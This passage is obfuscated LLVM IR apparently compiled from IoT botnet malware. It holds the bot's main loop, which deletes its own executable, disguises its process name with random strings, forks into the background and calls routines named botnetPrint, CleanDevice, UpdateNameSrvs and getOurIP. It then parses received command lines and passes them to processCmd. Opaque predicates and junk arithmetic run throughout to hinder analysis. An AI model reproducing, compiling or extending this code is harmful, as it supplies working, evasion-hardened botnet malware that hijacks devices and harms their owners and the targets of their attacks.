  %369 = mul i32 %366, %368
  %370 = urem i32 %369, 2
  %371 = icmp eq i32 %370, 0
  %372 = icmp slt i32 %367, 10
  %373 = or i1 %371, %372
  br i1 %373, label %originalBB158, label %originalBB158alteredBB

originalBB158:                                    ; preds = %originalBB158alteredBB, %365
  %374 = load i8*, i8** %26, align 8
  %375 = load i8, i8* %374, align 1
  %376 = zext i8 %375 to i32
  %377 = icmp ne i32 %376, 32
  %378 = load i32, i32* @x.111
  %379 = load i32, i32* @y.112
  %380 = sub i32 %378, 1
  %381 = mul i32 %378, %380
  %382 = urem i32 %381, 2
  %383 = icmp eq i32 %382, 0
  %384 = icmp slt i32 %379, 10
  %385 = or i1 %383, %384
  br i1 %385, label %originalBBpart2160, label %originalBB158alteredBB

originalBBpart2160:                               ; preds = %originalBB158
  br i1 %377, label %386, label %391

; <label>:386:                                    ; preds = %originalBBpart2160
  %387 = load i8*, i8** %26, align 8
  %388 = load i8, i8* %387, align 1
  %389 = zext i8 %388 to i32
  %390 = icmp ne i32 %389, 0
  br label %391

; <label>:391:                                    ; preds = %386, %originalBBpart2160
  %392 = phi i1 [ false, %originalBBpart2160 ], [ %390, %386 ]
  br i1 %392, label %393, label %412

; <label>:393:                                    ; preds = %391
  %394 = load i32, i32* @x.111
  %395 = load i32, i32* @y.112
  %396 = sub i32 %394, 1
  %397 = mul i32 %394, %396
  %398 = urem i32 %397, 2
  %399 = icmp eq i32 %398, 0
  %400 = icmp slt i32 %395, 10
  %401 = or i1 %399, %400
  br i1 %401, label %originalBB162, label %originalBB162alteredBB

originalBB162:                                    ; preds = %originalBB162alteredBB, %393
  %402 = load i8*, i8** %26, align 8
  %403 = getelementptr inbounds i8, i8* %402, i32 1
  store i8* %403, i8** %26, align 8
  %404 = load i32, i32* @x.111
  %405 = load i32, i32* @y.112
  %406 = sub i32 %404, 1
  %407 = mul i32 %404, %406
  %408 = urem i32 %407, 2
  %409 = icmp eq i32 %408, 0
  %410 = icmp slt i32 %405, 10
  %411 = or i1 %409, %410
  br i1 %411, label %originalBBpart2164, label %originalBB162alteredBB

originalBBpart2164:                               ; preds = %originalBB162
  br label %365

; <label>:412:                                    ; preds = %391
  %413 = load i8*, i8** %26, align 8
  %414 = load i8, i8* %413, align 1
  %415 = zext i8 %414 to i32
  %416 = icmp eq i32 %415, 0
  br i1 %416, label %417, label %418

; <label>:417:                                    ; preds = %412
  br label %176

; <label>:418:                                    ; preds = %412
  %419 = load i8*, i8** %26, align 8
  store i8 0, i8* %419, align 1
  %420 = load i8*, i8** %25, align 8
  %421 = getelementptr inbounds i8, i8* %420, i64 1
  store i8* %421, i8** %26, align 8
  %422 = load i8*, i8** %25, align 8
  %423 = load i8*, i8** %26, align 8
  %424 = call i64 @strlen(i8* %423) #9
  %425 = getelementptr inbounds i8, i8* %422, i64 %424
  %426 = getelementptr inbounds i8, i8* %425, i64 2
  store i8* %426, i8** %25, align 8
  br label %427

; <label>:427:                                    ; preds = %447, %418
  %428 = load i8*, i8** %25, align 8
  %429 = load i8*, i8** %25, align 8
  %430 = call i64 @strlen(i8* %429) #9
  %431 = sub i64 %430, 1
  %432 = getelementptr inbounds i8, i8* %428, i64 %431
  %433 = load i8, i8* %432, align 1
  %434 = zext i8 %433 to i32
  %435 = icmp eq i32 %434, 10
  br i1 %435, label %445, label %436

; <label>:436:                                    ; preds = %427
  %437 = load i8*, i8** %25, align 8
  %438 = load i8*, i8** %25, align 8
  %439 = call i64 @strlen(i8* %438) #9
  %440 = sub i64 %439, 1
  %441 = getelementptr inbounds i8, i8* %437, i64 %440
  %442 = load i8, i8* %441, align 1
  %443 = zext i8 %442 to i32
  %444 = icmp eq i32 %443, 13
  br label %445

; <label>:445:                                    ; preds = %436, %427
  %446 = phi i1 [ true, %427 ], [ %444, %436 ]
  br i1 %446, label %447, label %453

; <label>:447:                                    ; preds = %445
  %448 = load i8*, i8** %25, align 8
  %449 = load i8*, i8** %25, align 8
  %450 = call i64 @strlen(i8* %449) #9
  %451 = sub i64 %450, 1
  %452 = getelementptr inbounds i8, i8* %448, i64 %451
  store i8 0, i8* %452, align 1
  br label %427

; <label>:453:                                    ; preds = %445
  %454 = load i8*, i8** %25, align 8
  store i8* %454, i8** %27, align 8
  br label %455

; <label>:455:                                    ; preds = %467, %453
  %456 = load i8*, i8** %25, align 8
  %457 = load i8, i8* %456, align 1
  %458 = zext i8 %457 to i32
  %459 = icmp ne i32 %458, 32
  br i1 %459, label %460, label %465

; <label>:460:                                    ; preds = %455
  %461 = load i8*, i8** %25, align 8
  %462 = load i8, i8* %461, align 1
  %463 = zext i8 %462 to i32
  %464 = icmp ne i32 %463, 0
  br label %465

; <label>:465:                                    ; preds = %460, %455
  %466 = phi i1 [ false, %455 ], [ %464, %460 ]
  br i1 %466, label %467, label %470

; <label>:467:                                    ; preds = %465
  %468 = load i8*, i8** %25, align 8
  %469 = getelementptr inbounds i8, i8* %468, i32 1
  store i8* %469, i8** %25, align 8
  br label %455

; <label>:470:                                    ; preds = %465
  %471 = load i32, i32* @x.111
  %472 = load i32, i32* @y.112
  %473 = sub i32 %471, 1
  %474 = mul i32 %471, %473
  %475 = urem i32 %474, 2
  %476 = icmp eq i32 %475, 0
  %477 = icmp slt i32 %472, 10
  %478 = or i1 %476, %477
  br i1 %478, label %originalBB166, label %originalBB166alteredBB

originalBB166:                                    ; preds = %originalBB166alteredBB, %470
  %479 = load i8*, i8** %25, align 8
  store i8 0, i8* %479, align 1
  %480 = load i8*, i8** %25, align 8
  %481 = getelementptr inbounds i8, i8* %480, i32 1
  store i8* %481, i8** %25, align 8
  %482 = load i8*, i8** %27, align 8
  store i8* %482, i8** %28, align 8
  %483 = load i32, i32* @x.111
  %484 = load i32, i32* @y.112
  %485 = sub i32 %483, 1
  %486 = mul i32 %483, %485
  %487 = urem i32 %486, 2
  %488 = icmp eq i32 %487, 0
  %489 = icmp slt i32 %484, 10
  %490 = or i1 %488, %489
  br i1 %490, label %originalBBpart2168, label %originalBB166alteredBB

originalBBpart2168:                               ; preds = %originalBB166
  br label %491

; <label>:491:                                    ; preds = %originalBBpart2172, %originalBBpart2168
  %492 = load i8*, i8** %28, align 8
  %493 = load i8, i8* %492, align 1
  %494 = icmp ne i8 %493, 0
  br i1 %494, label %495, label %520

; <label>:495:                                    ; preds = %491
  %496 = load i32, i32* @x.111
  %497 = load i32, i32* @y.112
  %498 = sub i32 %496, 1
  %499 = mul i32 %496, %498
  %500 = urem i32 %499, 2
  %501 = icmp eq i32 %500, 0
  %502 = icmp slt i32 %497, 10
  %503 = or i1 %501, %502
  br i1 %503, label %originalBB170, label %originalBB170alteredBB

originalBB170:                                    ; preds = %originalBB170alteredBB, %495
  %504 = load i8*, i8** %28, align 8
  %505 = load i8, i8* %504, align 1
  %506 = zext i8 %505 to i32
  %507 = call i32 @toupper(i32 %506) #9
  %508 = trunc i32 %507 to i8
  %509 = load i8*, i8** %28, align 8
  store i8 %508, i8* %509, align 1
  %510 = load i8*, i8** %28, align 8
  %511 = getelementptr inbounds i8, i8* %510, i32 1
  store i8* %511, i8** %28, align 8
  %512 = load i32, i32* @x.111
  %513 = load i32, i32* @y.112
  %514 = sub i32 %512, 1
  %515 = mul i32 %512, %514
  %516 = urem i32 %515, 2
  %517 = icmp eq i32 %516, 0
  %518 = icmp slt i32 %513, 10
  %519 = or i1 %517, %518
  br i1 %519, label %originalBBpart2172, label %originalBB170alteredBB

originalBBpart2172:                               ; preds = %originalBB170
  br label %491

; <label>:520:                                    ; preds = %491
  store i32 1, i32* %30, align 4
  %521 = load i8*, i8** %25, align 8
  %522 = call i8* @strtok(i8* %521, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.143, i32 0, i32 0)) #3
  store i8* %522, i8** %31, align 8
  %523 = load i8*, i8** %27, align 8
  %524 = getelementptr inbounds [10 x i8*], [10 x i8*]* %29, i64 0, i64 0
  store i8* %523, i8** %524, align 16
  br label %525

; <label>:525:                                    ; preds = %572, %520
  %526 = load i8*, i8** %31, align 8
  %527 = icmp ne i8* %526, null
  br i1 %527, label %528, label %574

; <label>:528:                                    ; preds = %525
  %529 = load i32, i32* @x.111
  %530 = load i32, i32* @y.112
  %531 = sub i32 %529, 1
  %532 = mul i32 %529, %531
  %533 = urem i32 %532, 2
  %534 = icmp eq i32 %533, 0
  %535 = icmp slt i32 %530, 10
  %536 = or i1 %534, %535
  br i1 %536, label %originalBB174, label %originalBB174alteredBB

originalBB174:                                    ; preds = %originalBB174alteredBB, %528
  %537 = load i8*, i8** %31, align 8
  %538 = load i8, i8* %537, align 1
  %539 = zext i8 %538 to i32
  %540 = icmp ne i32 %539, 10
  %541 = load i32, i32* @x.111
  %542 = load i32, i32* @y.112
  %543 = sub i32 %541, 1
  %544 = mul i32 %541, %543
  %545 = urem i32 %544, 2
  %546 = icmp eq i32 %545, 0
  %547 = icmp slt i32 %542, 10
  %548 = or i1 %546, %547
  br i1 %548, label %originalBBpart2176, label %originalBB174alteredBB

originalBBpart2176:                               ; preds = %originalBB174
  br i1 %540, label %549, label %572

; <label>:549:                                    ; preds = %originalBBpart2176
  %550 = load i8*, i8** %31, align 8
  %551 = call i64 @strlen(i8* %550) #9
  %552 = add i64 %551, 1
  %553 = call noalias i8* @malloc(i64 %552) #3
  %554 = load i32, i32* %30, align 4
  %555 = sext i32 %554 to i64
  %556 = getelementptr inbounds [10 x i8*], [10 x i8*]* %29, i64 0, i64 %555
  store i8* %553, i8** %556, align 8
  %557 = load i32, i32* %30, align 4
  %558 = sext i32 %557 to i64
  %559 = getelementptr inbounds [10 x i8*], [10 x i8*]* %29, i64 0, i64 %558
  %560 = load i8*, i8** %559, align 8
  %561 = load i8*, i8** %31, align 8
  %562 = call i64 @strlen(i8* %561) #9
  %563 = add i64 %562, 1
  call void @llvm.memset.p0i8.i64(i8* %560, i8 0, i64 %563, i32 1, i1 false)
  %564 = load i32, i32* %30, align 4
  %565 = sext i32 %564 to i64
  %566 = getelementptr inbounds [10 x i8*], [10 x i8*]* %29, i64 0, i64 %565
  %567 = load i8*, i8** %566, align 8
  %568 = load i8*, i8** %31, align 8
  %569 = call i8* @strcpy(i8* %567, i8* %568) #3
  %570 = load i32, i32* %30, align 4
  %571 = add nsw i32 %570, 1
  store i32 %571, i32* %30, align 4
  br label %572

; <label>:572:                                    ; preds = %549, %originalBBpart2176
  %573 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.143, i32 0, i32 0)) #3
  store i8* %573, i8** %31, align 8
  br label %525

; <label>:574:                                    ; preds = %525
  %575 = load i32, i32* %30, align 4
  %576 = getelementptr inbounds [10 x i8*], [10 x i8*]* %29, i32 0, i32 0
  call void @processCmd(i32 %575, i8** %576)
  %577 = load i32, i32* %30, align 4
  %578 = icmp sgt i32 %577, 1
  br i1 %578, label %579, label %625

; <label>:579:                                    ; preds = %574
  store i32 1, i32* %32, align 4
  store i32 1, i32* %32, align 4
  br label %580

; <label>:580:                                    ; preds = %originalBBpart2192, %579
  %581 = load i32, i32* %32, align 4
  %582 = load i32, i32* %30, align 4
  %583 = icmp slt i32 %581, %582
  br i1 %583, label %584, label %624

; <label>:584:                                    ; preds = %580
  %585 = load i32, i32* @x.111
  %586 = load i32, i32* @y.112
  %587 = sub i32 %585, 1
  %588 = mul i32 %585, %587
  %589 = urem i32 %588, 2
  %590 = icmp eq i32 %589, 0
  %591 = icmp slt i32 %586, 10
  %592 = or i1 %590, %591
  br i1 %592, label %originalBB178, label %originalBB178alteredBB

originalBB178:                                    ; preds = %originalBB178alteredBB, %584
  %593 = load i32, i32* %32, align 4
  %594 = sext i32 %593 to i64
  %595 = getelementptr inbounds [10 x i8*], [10 x i8*]* %29, i64 0, i64 %594
  %596 = load i8*, i8** %595, align 8
  call void @free(i8* %596) #3
  %597 = load i32, i32* @x.111
  %598 = load i32, i32* @y.112
  %599 = sub i32 %597, 1
  %600 = mul i32 %597, %599
  %601 = urem i32 %600, 2
  %602 = icmp eq i32 %601, 0
  %603 = icmp slt i32 %598, 10
  %604 = or i1 %602, %603
  br i1 %604, label %originalBBpart2180, label %originalBB178alteredBB

originalBBpart2180:                               ; preds = %originalBB178
  br label %605

; <label>:605:                                    ; preds = %originalBBpart2180
  %606 = load i32, i32* @x.111
  %607 = load i32, i32* @y.112
  %608 = sub i32 %606, 1
  %609 = mul i32 %606, %608
  %610 = urem i32 %609, 2
  %611 = icmp eq i32 %610, 0
  %612 = icmp slt i32 %607, 10
  %613 = or i1 %611, %612
  br i1 %613, label %originalBB182, label %originalBB182alteredBB

originalBB182:                                    ; preds = %originalBB182alteredBB, %605
  %614 = load i32, i32* %32, align 4
  %615 = add nsw i32 %614, 1
  store i32 %615, i32* %32, align 4
  %616 = load i32, i32* @x.111
  %617 = load i32, i32* @y.112
  %618 = sub i32 %616, 1
  %619 = mul i32 %616, %618
  %620 = urem i32 %619, 2
  %621 = icmp eq i32 %620, 0
  %622 = icmp slt i32 %617, 10
  %623 = or i1 %621, %622
  br i1 %623, label %originalBBpart2192, label %originalBB182alteredBB

originalBBpart2192:                               ; preds = %originalBB182
  br label %580

; <label>:624:                                    ; preds = %580
  br label %625

; <label>:625:                                    ; preds = %624, %574
  %626 = load i32, i32* @x.111
  %627 = load i32, i32* @y.112
  %628 = sub i32 %626, 1
  %629 = mul i32 %626, %628
  %630 = urem i32 %629, 2
  %631 = icmp eq i32 %630, 0
  %632 = icmp slt i32 %627, 10
  %633 = or i1 %631, %632
  br i1 %633, label %originalBB194, label %originalBB194alteredBB

originalBB194:                                    ; preds = %originalBB194alteredBB, %625
  %634 = load i32, i32* @x.111
  %635 = load i32, i32* @y.112
  %636 = sub i32 %634, 1
  %637 = mul i32 %634, %636
  %638 = urem i32 %637, 2
  %639 = icmp eq i32 %638, 0
  %640 = icmp slt i32 %635, 10
  %641 = or i1 %639, %640
  br i1 %641, label %originalBBpart2196, label %originalBB194alteredBB

originalBBpart2196:                               ; preds = %originalBB194
  br label %642

; <label>:642:                                    ; preds = %originalBBpart2196, %352
  br label %176

; <label>:643:                                    ; preds = %176
  br label %148
                                                  ; No predecessors!
  %645 = load i32, i32* %11, align 4
  ret i32 %645

originalBBalteredBB:                              ; preds = %originalBB, %2
  %646 = alloca i32, align 4
  %647 = alloca i32, align 4
  %648 = alloca i8**, align 8
  %649 = alloca [32 x i8], align 16
  %650 = alloca [32 x i8], align 16
  %651 = alloca i32, align 4
  %652 = alloca i32, align 4
  %653 = alloca i32, align 4
  %654 = alloca i32, align 4
  %655 = alloca [4096 x i8], align 16
  %656 = alloca i32, align 4
  %657 = alloca i32, align 4
  %658 = alloca i32*, align 8
  %659 = alloca i32, align 4
  %660 = alloca i8*, align 8
  %661 = alloca i8*, align 8
  %662 = alloca i8*, align 8
  %663 = alloca i8*, align 8
  %664 = alloca [10 x i8*], align 16
  %665 = alloca i32, align 4
  %666 = alloca i8*, align 8
  %667 = alloca i32, align 4
  store i32 0, i32* %646, align 4
  store i32 %0, i32* %647, align 4
  store i8** %1, i8*** %648, align 8
  %668 = load i8**, i8*** %648, align 8
  %669 = getelementptr inbounds i8*, i8** %668, i64 0
  %670 = load i8*, i8** %669, align 8
  %671 = call i32 @unlink(i8* %670) #3
  call void @rand_init()
  %672 = call i32 @rand_next()
  %_ = sub i32 %672, 4
  %gen = mul i32 %_, 4
  %_1 = sub i32 %672, 4
  %gen2 = mul i32 %_1, 4
  %_3 = shl i32 %672, 4
  %_4 = sub i32 %672, 4
  %gen5 = mul i32 %_4, 4
  %_6 = sub i32 0, %672
  %gen7 = add i32 %_6, 4
  %_8 = sub i32 %672, 4
  %gen9 = mul i32 %_8, 4
  %_10 = shl i32 %672, 4
  %_11 = sub i32 %672, 4
  %gen12 = mul i32 %_11, 4
  %673 = urem i32 %672, 4
  %_13 = shl i32 %673, 3
  %_14 = sub i32 %673, 3
  %gen15 = mul i32 %_14, 3
  %_16 = sub i32 0, %673
  %gen17 = add i32 %_16, 3
  %674 = add i32 %673, 3
  %_18 = shl i32 %674, 4
  %_19 = sub i32 %674, 4
  %gen20 = mul i32 %_19, 4
  %_21 = sub i32 %674, 4
  %gen22 = mul i32 %_21, 4
  %_23 = sub i32 0, %674
  %gen24 = add i32 %_23, 4
  %_25 = sub i32 %674, 4
  %gen26 = mul i32 %_25, 4
  %_27 = sub i32 0, %674
  %gen28 = add i32 %_27, 4
  %_29 = shl i32 %674, 4
  %_30 = sub i32 %674, 4
  %gen31 = mul i32 %_30, 4
  %675 = mul i32 %674, 4
  store i32 %675, i32* %651, align 4
  %676 = getelementptr inbounds [32 x i8], [32 x i8]* %649, i32 0, i32 0
  %677 = load i32, i32* %651, align 4
  call void @rand_alphastr(i8* %676, i32 %677)
  %678 = load i32, i32* %651, align 4
  %679 = sext i32 %678 to i64
  %680 = getelementptr inbounds [32 x i8], [32 x i8]* %649, i64 0, i64 %679
  store i8 0, i8* %680, align 1
  %681 = load i8**, i8*** %648, align 8
  %682 = getelementptr inbounds i8*, i8** %681, i64 0
  %683 = load i8*, i8** %682, align 8
  %684 = getelementptr inbounds [32 x i8], [32 x i8]* %649, i32 0, i32 0
  %685 = call i32 @util_strcpy(i8* %683, i8* %684)
  %686 = call i32 @rand_next()
  %_32 = sub i32 %686, 6
  %gen33 = mul i32 %_32, 6
  %_34 = sub i32 %686, 6
  %gen35 = mul i32 %_34, 6
  %_36 = sub i32 0, %686
  %gen37 = add i32 %_36, 6
  %_38 = sub i32 %686, 6
  %gen39 = mul i32 %_38, 6
  %_40 = sub i32 %686, 6
  %gen41 = mul i32 %_40, 6
  %687 = urem i32 %686, 6
  %_42 = sub i32 %687, 3
  %gen43 = mul i32 %_42, 3
  %_44 = sub i32 %687, 3
  %gen45 = mul i32 %_44, 3
  %_46 = sub i32 0, %687
  %gen47 = add i32 %_46, 3
  %_48 = shl i32 %687, 3
  %_49 = shl i32 %687, 3
  %_50 = sub i32 0, %687
  %gen51 = add i32 %_50, 3
  %688 = add i32 %687, 3
  %_52 = sub i32 %688, 4
  %gen53 = mul i32 %_52, 4
  %_54 = sub i32 %688, 4
  %gen55 = mul i32 %_54, 4
  %_56 = shl i32 %688, 4
  %_57 = shl i32 %688, 4
  %_58 = sub i32 0, %688
  %gen59 = add i32 %_58, 4
  %_60 = sub i32 0, %688
  %gen61 = add i32 %_60, 4
  %_62 = shl i32 %688, 4
  %689 = mul i32 %688, 4
  store i32 %689, i32* %651, align 4
  %690 = getelementptr inbounds [32 x i8], [32 x i8]* %649, i32 0, i32 0
  %691 = load i32, i32* %651, align 4
  call void @rand_alphastr(i8* %690, i32 %691)
  %692 = load i32, i32* %651, align 4
  %693 = sext i32 %692 to i64
  %694 = getelementptr inbounds [32 x i8], [32 x i8]* %649, i64 0, i64 %693
  store i8 0, i8* %694, align 1
  %695 = getelementptr inbounds [32 x i8], [32 x i8]* %649, i32 0, i32 0
  %696 = call i32 (i32, ...) @prctl(i32 15, i8* %695) #3
  %697 = call i64 @time(i64* null) #3
  %698 = call i32 @getpid() #3
  %699 = sext i32 %698 to i64
  %_63 = sub i64 %697, %699
  %gen64 = mul i64 %_63, %699
  %_65 = sub i64 %697, %699
  %gen66 = mul i64 %_65, %699
  %_67 = shl i64 %697, %699
  %_68 = sub i64 %697, %699
  %gen69 = mul i64 %_68, %699
  %_70 = sub i64 0, %697
  %gen71 = add i64 %_70, %699
  %700 = xor i64 %697, %699
  %701 = trunc i64 %700 to i32
  call void @srand(i32 %701) #3
  call void @rand_init()
  %702 = call i32 @getOurIP()
  %703 = call i32 @fork() #3
  store i32 %703, i32* %652, align 4
  %704 = icmp ne i32 %703, 0
  br label %originalBB

originalBB72alteredBB:                            ; preds = %originalBB72, %78
  %705 = load i32, i32* %17, align 4
  %706 = call i32 @waitpid(i32 %705, i32* %19, i32 0)
  call void @exit(i32 0) #11
  br label %originalBB72

originalBB76alteredBB:                            ; preds = %originalBB76, %100
  %707 = call i32 @fork() #3
  store i32 %707, i32* %18, align 4
  %708 = icmp ne i32 %707, 0
  br label %originalBB76

originalBB80alteredBB:                            ; preds = %originalBB80, %125
  br label %originalBB80

originalBB84alteredBB:                            ; preds = %originalBB84, %152
  %709 = load i32, i32* @switchCommStock, align 4
  %710 = call i8* @getBuild()
  %711 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %712 = call i8* @inet_ntoa(i32 %711) #3
  %713 = call i32 @getEndianness()
  %714 = call i8* @getBuildz()
  %715 = call i32 (i32, i8*, ...) @botnetPrint(i32 %709, i8* getelementptr inbounds ([130 x i8], [130 x i8]* @.str.142, i32 0, i32 0), i8* %710, i8* %712, i32 %713, i8* %714)
  call void @CleanDevice()
  call void @UpdateNameSrvs()
  store i32 0, i32* %21, align 4
  store i32 0, i32* %22, align 4
  br label %originalBB84

originalBB88alteredBB:                            ; preds = %originalBB88, %198
  %716 = load i32, i32* %24, align 4
  %717 = zext i32 %716 to i64
  %718 = load i64, i64* @numpids, align 8
  %719 = icmp ult i64 %717, %718
  br label %originalBB88

originalBB92alteredBB:                            ; preds = %originalBB92, %230
  %720 = load i32, i32* %24, align 4
  %_93 = sub i32 0, %720
  %gen94 = add i32 %_93, 1
  %_95 = sub i32 0, %720
  %gen96 = add i32 %_95, 1
  %_97 = sub i32 %720, 1
  %gen98 = mul i32 %_97, 1
  %721 = add i32 %720, 1
  store i32 %721, i32* %24, align 4
  br label %originalBB92

originalBB102alteredBB:                           ; preds = %originalBB102, %249
  %722 = load i32*, i32** @pids, align 8
  %723 = load i32, i32* %24, align 4
  %_103 = sub i32 %723, 1
  %gen104 = mul i32 %_103, 1
  %_105 = sub i32 %723, 1
  %gen106 = mul i32 %_105, 1
  %_107 = sub i32 %723, 1
  %gen108 = mul i32 %_107, 1
  %_109 = sub i32 %723, 1
  %gen110 = mul i32 %_109, 1
  %_111 = shl i32 %723, 1
  %_112 = sub i32 0, %723
  %gen113 = add i32 %_112, 1
  %_114 = shl i32 %723, 1
  %724 = sub i32 %723, 1
  %725 = zext i32 %724 to i64
  %726 = getelementptr inbounds i32, i32* %722, i64 %725
  store i32 0, i32* %726, align 4
  %727 = load i64, i64* @numpids, align 8
  %_115 = sub i64 %727, -1
  %gen116 = mul i64 %_115, -1
  %_117 = sub i64 %727, -1
  %gen118 = mul i64 %_117, -1
  %_119 = sub i64 0, %727
  %gen120 = add i64 %_119, -1
  %_121 = sub i64 0, %727
  %gen122 = add i64 %_121, -1
  %_123 = sub i64 0, %727
  %gen124 = add i64 %_123, -1
  %_125 = sub i64 0, %727
  %gen126 = add i64 %_125, -1
  %_127 = sub i64 %727, -1
  %gen128 = mul i64 %_127, -1
  %728 = add i64 %727, -1
  store i64 %728, i64* @numpids, align 8
  %729 = load i64, i64* @numpids, align 8
  %_129 = sub i64 %729, 1
  %gen130 = mul i64 %_129, 1
  %_131 = shl i64 %729, 1
  %730 = add i64 %729, 1
  %_132 = shl i64 %730, 4
  %_133 = sub i64 %730, 4
  %gen134 = mul i64 %_133, 4
  %_135 = sub i64 0, %730
  %gen136 = add i64 %_135, 4
  %_137 = shl i64 %730, 4
  %_138 = shl i64 %730, 4
  %_139 = sub i64 %730, 4
  %gen140 = mul i64 %_139, 4
  %_141 = sub i64 %730, 4
  %gen142 = mul i64 %_141, 4
  %731 = mul i64 %730, 4
  %732 = call noalias i8* @malloc(i64 %731) #3
  %733 = bitcast i8* %732 to i32*
  store i32* %733, i32** %23, align 8
  store i32 0, i32* %24, align 4
  br label %originalBB102

originalBB146alteredBB:                           ; preds = %originalBB146, %278
  %734 = load i32, i32* %24, align 4
  %735 = zext i32 %734 to i64
  %736 = load i64, i64* @numpids, align 8
  %737 = icmp ult i64 %735, %736
  br label %originalBB146

originalBB150alteredBB:                           ; preds = %originalBB150, %299
  %738 = load i32*, i32** @pids, align 8
  %739 = load i32, i32* %24, align 4
  %740 = zext i32 %739 to i64
  %741 = getelementptr inbounds i32, i32* %738, i64 %740
  %742 = load i32, i32* %741, align 4
  %743 = load i32*, i32** %23, align 8
  %744 = load i32, i32* %24, align 4
  %745 = zext i32 %744 to i64
  %746 = getelementptr inbounds i32, i32* %743, i64 %745
  store i32 %742, i32* %746, align 4
  br label %originalBB150

originalBB154alteredBB:                           ; preds = %originalBB154, %332
  br label %originalBB154

originalBB158alteredBB:                           ; preds = %originalBB158, %365
  %747 = load i8*, i8** %26, align 8
  %748 = load i8, i8* %747, align 1
  %749 = zext i8 %748 to i32
  %750 = icmp ne i32 %749, 32
  br label %originalBB158

originalBB162alteredBB:                           ; preds = %originalBB162, %393
  %751 = load i8*, i8** %26, align 8
  %752 = getelementptr inbounds i8, i8* %751, i32 1
  store i8* %752, i8** %26, align 8
  br label %originalBB162

originalBB166alteredBB:                           ; preds = %originalBB166, %470
  %753 = load i8*, i8** %25, align 8
  store i8 0, i8* %753, align 1
  %754 = load i8*, i8** %25, align 8
  %755 = getelementptr inbounds i8, i8* %754, i32 1
  store i8* %755, i8** %25, align 8
  %756 = load i8*, i8** %27, align 8
  store i8* %756, i8** %28, align 8
  br label %originalBB166

originalBB170alteredBB:                           ; preds = %originalBB170, %495
  %757 = load i8*, i8** %28, align 8
  %758 = load i8, i8* %757, align 1
  %759 = zext i8 %758 to i32
  %760 = call i32 @toupper(i32 %759) #9
  %761 = trunc i32 %760 to i8
  %762 = load i8*, i8** %28, align 8
  store i8 %761, i8* %762, align 1
  %763 = load i8*, i8** %28, align 8
  %764 = getelementptr inbounds i8, i8* %763, i32 1
  store i8* %764, i8** %28, align 8
  br label %originalBB170

originalBB174alteredBB:                           ; preds = %originalBB174, %528
  %765 = load i8*, i8** %31, align 8
  %766 = load i8, i8* %765, align 1
  %767 = zext i8 %766 to i32
  %768 = icmp ne i32 %767, 10
  br label %originalBB174

originalBB178alteredBB:                           ; preds = %originalBB178, %584
  %769 = load i32, i32* %32, align 4
  %770 = sext i32 %769 to i64
  %771 = getelementptr inbounds [10 x i8*], [10 x i8*]* %29, i64 0, i64 %770
  %772 = load i8*, i8** %771, align 8
  call void @free(i8* %772) #3
  br label %originalBB178

originalBB182alteredBB:                           ; preds = %originalBB182, %605
  %773 = load i32, i32* %32, align 4
  %_183 = sub i32 %773, 1
  %gen184 = mul i32 %_183, 1
  %_185 = sub i32 0, %773
  %gen186 = add i32 %_185, 1
  %_187 = sub i32 %773, 1
  %gen188 = mul i32 %_187, 1
  %_189 = sub i32 0, %773
  %gen190 = add i32 %_189, 1
  %774 = add nsw i32 %773, 1
  store i32 %774, i32* %32, align 4
  br label %originalBB182

originalBB194alteredBB:                           ; preds = %originalBB194, %625
  br label %originalBB194
}

; Function Attrs: nounwind
declare i32 @unlink(i8*) #1

; Function Attrs: nounwind
declare i32 @prctl(i32, ...) #1

declare i32 @waitpid(i32, i32*, i32) #2

; Function Attrs: nounwind
declare i32 @chdir(i8*) #1

; Function Attrs: nounwind
declare void (i32)* @signal(i32, void (i32)*) #1

; Function Attrs: nounwind readonly
declare i32 @toupper(i32) #5

attributes #0 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { nounwind }
attributes #4 = { argmemonly nounwind }
attributes #5 = { nounwind readonly "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #6 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
